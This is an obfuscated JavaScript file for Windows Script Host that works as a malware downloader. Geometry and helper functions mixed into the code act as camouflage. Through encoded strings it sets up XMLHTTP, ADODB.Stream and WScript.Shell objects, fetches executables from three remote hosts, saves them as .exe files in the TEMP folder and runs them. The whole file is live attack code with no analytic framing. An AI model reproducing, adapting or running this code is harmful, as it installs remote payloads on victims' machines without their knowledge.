
var goody = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  closeted = [];
var reservation = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};var assessed = 0;
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function mentor(posts) {
	profusely = posts;
	for (var i in reservation){profusely = profusely.replace(i, reservation[i]);}
    return profusely;
};

var ladder = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.mentor4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("formula").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = goody[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = goody[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = goody[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = goody[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var drops ="formulaJVformulaRFTVformulaAl".mentor4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var organizations = "formulaQWformulaN0aXZformulalWE9iaformulamVjdA=formula=".mentor4();
String.prototype.mentor2 = function () {
    var heart = {
        accompanies: this
    };
    heart.laura = heart.accompanies["c3Vic3RyaW5n".mentor4()](assessed, ladder);
    return heart.laura;
};

var inquiries ="formulaRXhwYW5formulakRW52aXformulaJvbm1lbnRTdHJformulapbmdz".mentor4();
var Native = function(options){
	
};
var regrettable = [organizations, inquiries,drops,  ""+"."+("laughing","bubble","lions","antarctica","lamentably","defilement","ashen","disproportionate","exe"), "UnVu".mentor4(), mentor("M"+"SX"+"ML"+("strictly","stupidly","supreme","temporary","academies","mixed","acute","2.")+"|M"+"LH"+"TT"+("hessian","estate","climb","corinth","safely","austin","debility","armed","P>")+"WU"+("orifice","pneumonia","yellow","entries","brazil","stinking","relaxation","cr")+("stockade","pressgang","assortment","infringement","members","amorphous","soviet","argentine","ip")+"t:"+("assets","heather","sprouted","midway","serial","recorded","hostelry","puerile","Sh")+"ell")];
negotiations = "_F2_";
var canter = this[regrettable.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
SISWuORe = "BPDmDUqbm";
eclipse = (("wooden", "weapons", "details", "college", "oriental", "emotions", "ambergris", "pcEBuHfupu") + "axHmNP").mentor2();
officious = (("autocratic", "voting", "anatomical", "demesne", "crackers", "cherubim", "assigning", "victorian", "trestle", "sKmxwYVhSt") + "PjTxILuWOqo").mentor2();
  
    String.prototype.depravity = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var cockade = regrettable.pop().split(">");

mesquite = "b3Blbg==".mentor4();
var effect = new canter(cockade[1]);
var pyjamas = new canter(cockade[0]);
var smaller = effect[regrettable.shift()](regrettable.shift());
weasel = (("bestiality", "florence", "washer", "inspector", "EQYywbAe") + "rxMuEN").mentor2();

var criteria = regrettable.shift();
var promises = regrettable.shift();
function chauffeur(tattooed, purposes) {

    try {
        var fiftieth = smaller + "/" + purposes ;
		fiftieth = fiftieth+ criteria;
            pyjamas[mesquite](("indigent","sawdust","G" + weasel) + ("cobweb","astride","incentive","fitted","T"), tattooed, false);
       
    fcIuAnmDgA = "_F7_";
    pyjamas[officious + ("expire","norway","end")]();
	var forster=(WScript+"eclipse"=="V2luZG93cyBTY3JpcHQgSG9zdA==".mentor4()+"eclipse")&&pyjamas["c3RhdHVz".mentor4()] +""=="MjAw".mentor4()&&typeof(rKnpYylAv)==="undefined";
	lQHNgR = "_F8_";
    if (forster) {
		
        var solomon = new canter((("restored","oblivious","papers","height","might","garnered","creative","afterthought","A")+("darkness","sacrilegious","scanning","provender","slack","craig","preventive","shopkeeper","SEOO")+"DB"+("western","tracked","citizens","marie","regulated","twiki","pickup",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        solomon[mesquite]();
        WBTGNlBs = "_F9_";
        solomon.type = ladder;
        zRTVoTgV = "_F10_";
        solomon["d3JpdGU=".mentor4()](pyjamas[("several","uncle","minor","animate","bitch","basics","trousseau","")+"R"+"es"+"pon"+reservation['U'].toLowerCase()+"e"+"Qm9keQ==".mentor4()]);
        VDurVwitTb = "_F11_";
        solomon[(eclipse + "o"+("klein","subversive","wrapper","naked","ashley","tickle","ethiopian","amiability","00")+("narcotic","tepee","methodical","bleed","unconcerned","tourism","auctioneer","8i")+"tion").replace("0"+("contiguous","conducted","insufferable","mariner","membership","chevalier","offering","08"), officious)] = 0;
        niesriAN = "_F12_";
        solomon[("shameless","disreputable","mechanics","profits","intermixture","abstracted","alpha","s")+"aveT"+"oF"+"ile"](fiftieth, 2);
        LcKlKbLwNX = "_F13_";
        solomon.close();
        RCxDQcEF = "_F14_";
		effect[promises](fiftieth, ladder, true);
    }
} catch (xurzShqN) { };

    EgsribTSi = "_F15_";
}
try{
chauffeur("aHR0cDovLw==".mentor4()+"\u0070\u0061\u006E\u0061\u0063\u0065\u0079\u0061"+"\u002E\u006E\u0069\u0063\u0068\u006F\u0073\u0074\u002E\u0072\u0075\u002F\u0073\u0064\u0066\u0067\u0034\u0067\u0033" + "?UJKEUFFKK=AoCUqprJk","DJXUiRcA");}catch(wIXTXJML){}

try{
chauffeur("aHR0cDovLw==".mentor4()+"\u0073\u0069\u0074\u0065\u0072\u0069\u0071\u0069"+"\u002E\u0062\u0067\u0065\u0074\u002E\u0072\u0075\u002F\u0036\u0035\u0067\u0034\u0033\u0034\u0066" + "?vTnwFnbqCx=SJkHPd","LPwdDeq");}catch(QBtEkCC){}
chauffeur("aHR0cDovLw==".mentor4()+"\u0073\u0065\u0072\u0076\u0069\u0063\u0065\u0061\u0075\u0074\u006F\u0069\u0061\u0073"+"\u0069\u002E\u0063\u006F\u006D\u002F\u0034\u0033\u0034\u0035\u0034\u0079\u0074\u0033\u0032" + "?nqfgdJTQo=zALyqdUyb","sspifrvyVXn");
   qiVqKVhb = "_F16_";
   